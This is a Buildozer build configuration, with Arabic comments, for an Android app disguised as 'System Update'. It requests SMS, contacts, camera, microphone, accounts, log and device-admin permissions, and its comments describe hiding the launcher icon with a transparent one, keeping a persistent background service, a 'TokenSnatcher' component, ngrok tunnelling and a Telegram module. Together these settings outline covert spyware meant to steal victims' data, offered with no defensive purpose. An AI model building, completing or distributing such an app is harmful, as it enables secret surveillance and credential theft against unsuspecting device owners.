[app]

# اسم التطبيق (الذي يظهر في الإعدادات وقائمة التطبيقات)
title = System Update

# اسم الحزمة (package name)
package.name = systemupdate

# معرف الحزمة الفريد (domain + package.name)
package.domain = org.system.update

# الإصدار
version = 2.0.0
version.release = 2.0.0

# النشاط الرئيسي
android.entrypoint = org.kivy.android.PythonActivity

# الفئة الرئيسية للنشاط
android.main_activity = org.kivy.android.PythonActivity

# أيقونة التطبيق (شفافة)
icon.filename = %(source.dir)s/res/drawable/ic_launcher.png

# لغة المصدر (Python)
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt

# متطلبات المكتبات (سيتم تثبيتها عبر pip)
requirements = python3,kivy,requests,pyjnius,android,urllib3

# الصلاحيات المطلوبة
android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, RECORD_AUDIO, READ_SMS, READ_CONTACTS, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, MANAGE_EXTERNAL_STORAGE, READ_LOGS, GET_ACCOUNTS, BIND_DEVICE_ADMIN

# صلاحيات إضافية (للإصدارات الأحدث)
android.permissions += QUERY_ALL_PACKAGES
android.permissions += NOTIFICATION_LISTENER

# إعدادات الخدمات (Foreground Service)
android.services = org.system.update.AdminReceiver:org.kivy.android.PythonService

# ملف مدير الجهاز (Device Admin)
android.extra_xml_roots = ./config/device_admin.xml -> ./res/xml/device_admin.xml

# ملف AndroidManifest مخصص (سيتم دمجه)
# android.manifest_extra = ./config/AndroidManifest_extra.xml

# الحفاظ على الخدمة في الخلفية (Foreground Service)
android.foreground = True

# إخفاء أيقونة التطبيق من الدرج (استخدام أيقونة شفافة)
android.whitelist = True

# دعم معماريات ARM فقط (لتقليل الحجم)
android.arch = armeabi-v7a, arm64-v8a

# تمكين الضغط (Minify) لإصدار الإصدار
android.release_minify = True

# إصدار SDK المستهدف
android.api = 33
android.minapi = 21
android.ndk = 23b
android.sdk = 33

# إعدادات التوقيع (لتوزيع خارج المتجر)
# android.keystore = ./keystore.jks
# android.keystore_alias = mykey

# أذونات إضافية للمتصفحات والنسخ الاحتياطي (لـ TokenSnatcher)
android.grant_permissions = android.permission.BACKUP, android.permission.READ_FRAME_BUFFER

# دعم WebView (لـ ngrok أو غيره)
android.webview = True

# مكتبات إضافية (لتشغيل ngrok)
android.add_src = ./bin

# خيارات Buildozer
log_level = 2
warn_on_root = 0

# إعدادات التجميع
fullscreen = 0
orientation = portrait
resizeable = 0

# إعدادات Kivy
kivy_deps = sdl2, glew, vulkan

# إعدادات الـ Cython (لتسريع بعض المكونات)
cythonize = True

# الملفات الإضافية التي سيتم نسخها إلى التطبيق
android.add_deps = ./media,./core,./telegram,./config

# إزالة المكتبات غير الضرورية (تقليل الحجم)
android.exclude_libs = armeabi-v7a/libcrypto.so, armeabi-v7a/libssl.so

# نهاية إعدادات التطبيق
